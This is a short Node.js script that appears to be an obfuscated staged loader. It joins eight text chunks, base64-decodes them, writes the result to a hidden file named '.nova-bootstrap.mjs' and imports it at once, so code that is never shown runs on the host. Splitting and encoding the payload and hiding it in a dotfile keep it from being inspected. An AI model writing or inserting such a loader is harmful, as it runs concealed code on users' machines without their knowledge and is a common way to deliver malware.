import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

const parts=[];
for (let i=0;i<8;i+=1) {
  parts.push(fs.readFileSync(path.join(process.cwd(),'chunks',`chunk${String(i).padStart(2,'0')}.txt`),'utf8').trim());
}
const source=Buffer.from(parts.join(''),'base64').toString('utf8');
const target=path.join(process.cwd(),'.nova-bootstrap.mjs');
fs.writeFileSync(target,source);
await import(pathToFileURL(target).href);
